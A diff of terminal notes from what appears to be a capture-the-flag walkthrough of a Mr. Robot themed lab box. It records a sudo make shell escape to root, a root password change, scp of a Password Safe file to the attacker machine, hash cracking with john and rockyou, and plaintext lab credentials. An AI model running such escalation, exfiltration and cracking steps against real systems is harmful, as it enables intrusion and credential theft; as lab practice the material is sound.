@@ -660,8 +660,7 @@ client_loop: send disconnect: Broken pipe
 ┌──(kali㉿kali)-[~/Documents/mrRobot]
 └─$ ssh -i id_rsa.fixed parker@10.0.250.8 -p 2222
 Last login: Wed Sep 17 23:09:23 2025 from 10.0.250.1
-parker@ae3ff527ff85:~$ su goddard
-Password: 
+
 goddard@ae3ff527ff85:/home/parker$ COMMAND='/bin/sh'
 goddard@ae3ff527ff85:/home/parker$ sudo make -s --eval=$'x:\n\t-'"/bin/sh"
 # whoami
@@ -713,3 +712,137 @@ secrets.psafe3
 =============================================================================================================================================================================================
 
 # scp secrets.psafe3 kali@10.0.250.5:/home/kali/Documents/mrRobot/
+
+# scp secrets.psafe3 kali@10.0.250.5:/home/kali/Documents/mrRobot/
+
+
+# passwd
+New password: 
+Retype new password: 
+passwd: password updated successfully
+
+
+# scp secrets.psafe3 kali@10.0.250.5:/home/kali/Documents/mrRobot/
+The authenticity of host '10.0.250.5 (10.0.250.5)' can't be established.
+ED25519 key fingerprint is SHA256:ITDL7jCHFLTPzaK1+kaob4/YTYLjdV6XzG8K2OxAD6g.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.0.250.5' (ED25519) to the list of known hosts.
+kali@10.0.250.5's password: 
+secrets.psafe3                                                                                                            100% 1656     2.0MB/s   00:00    
+# 
+=============================================================================================================================================================================================
+
+
+
+
+
+┌──(kali㉿kali)-[~/Documents/mrRobot]
+└─$ pwsafe2john secrets.psafe3 > hash.txt
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/mrRobot]
+└─$ cat hash.txt  
+secret:$pwsafe$*3*c2c939945133efa3686bcc5f75d5db7cd3cdecded79a534ca63a0c75faae1563*262144*6d84e3e89a22f99b44b5a77c13bb05ac917fde833d0e9979e506c3919efdaca6
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/mrRobot]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt      
+Using default input encoding: UTF-8
+Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
+Cost 1 (iteration count) is 262144 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+rockandroll      (secret)     
+1g 0:00:00:40 DONE (2025-09-18 12:09) 0.02495g/s 153.3p/s 153.3c/s 153.3C/s newzealand..iheartyou
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+
+
+
+
+
+=============================================================================================================================================================================================
+
+ssh
+
+
+cisco
+
+sMpam!dE#8@$$1P%bnV@fFxdqjFFG#
+
+=============================================================================================================================================================================================
+
+
+┌──(kali㉿kali)-[~/Documents/Go-Hash]
+└─$ ssh cisco@10.0.250.8    
+cisco@10.0.250.8's password: 
+Linux allsafe 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
+███╗   ███╗██████╗        ██████╗  ██████╗ ██████╗  ██████╗ ████████╗
+████╗ ████║██╔══██╗       ██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝
+██╔████╔██║██████╔╝       ██████╔╝██║   ██║██████╔╝██║   ██║   ██║   
+██║╚██╔╝██║██╔══██╗       ██╔══██╗██║   ██║██╔══██╗██║   ██║   ██║   
+██║ ╚═╝ ██║██║  ██║██╗    ██║  ██║╚██████╔╝██████╔╝╚██████╔╝   ██║   
+╚═╝     ╚═╝╚═╝  ╚═╝╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝   
+Last login: Fri Aug 22 23:59:20 2025 from 192.168.1.19
+cisco@allsafe:~$ ls
+darkarmy.bin
+cisco@allsafe:~$ cat darkarmy.bin 
+70617373776f72643d64726b32303235210a
+cisco@allsafe:~$ 
+
+=============================================================================================================================================================================================
+
+┌──(kali㉿kali)-[~/Documents/Go-Hash]
+└─$ python3 gohash.py 
+
+
+     ██████╗  ██████╗       ██╗  ██╗ █████╗ ███████╗██╗  ██╗
+    ██╔════╝ ██╔═══██╗      ██║  ██║██╔══██╗██╔════╝██║  ██║
+    ██║  ███╗██║   ██║█████╗███████║███████║███████╗███████║
+    ██║   ██║██║   ██║╚════╝██╔══██║██╔══██║╚════██║██╔══██║
+    ╚██████╔╝╚██████╔╝      ██║  ██║██║  ██║███████║██║  ██║
+     ╚═════╝  ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+            <<------ C O D E   B Y   H U N X ------>>
+                       < Hash identified >
+
+  [+] Enter Your Hash : 70617373776f72643d64726b32303235210a
+
+  ===================== Show Algorithm Hash ====================
+
+  [+] Hash : 70617373776f72643d64726b32303235210a
+  [+] Algorithm : Hex encoded string
+
+  ==============================================================
+
+  Do you want to identify the hash again? Y/N : N
+  Exit ToolS !!!
+                                                                                                                                                            
+┌──(kali㉿kali)-[~/Documents/Go-Hash]
+└─$ echo -n "70617373776f72643d64726b32303235210a" | xxd -r -p
+password=drk2025!
+                                                                                                                                                            
+
+
+
+=============================================================================================================================================================================================
+
+cisco@allsafe:~$ ls -la
+total 28
+drwxr-xr-x 2 cisco cisco 4096 ago 22 17:20 .
+drwxr-xr-x 4 root  root  4096 ago 21 15:30 ..
+lrwxrwxrwx 1 root  root     9 ago 22 17:20 .bash_history -> /dev/null
+-rw-r--r-- 1 cisco cisco  220 abr 23  2023 .bash_logout
+-rw-r--r-- 1 cisco cisco 3526 abr 23  2023 .bashrc
+-rw-r--r-- 1 root  root    37 ago 22 00:48 darkarmy.bin
+-rw-r--r-- 1 cisco cisco  807 abr 23  2023 .profile
+-rw-r--r-- 1 root  root   342 ago 22 00:38 .unknown
+cisco@allsafe:~$ cat .unknown 
+Si quieres comunicarte con nosotros, no vuelvas a usar los canales habituales.
+A partir de ahora, todo contacto será únicamente a través del canal seguro.
+
+Conéctate al servidor de mensajería y entra en la sala:
+    dark-ops
+
+No intentes usar este acceso para nada más que lo acordado.  
+Nosotros decidimos cuándo y cómo se conversa.
+cisco@allsafe:~$ 
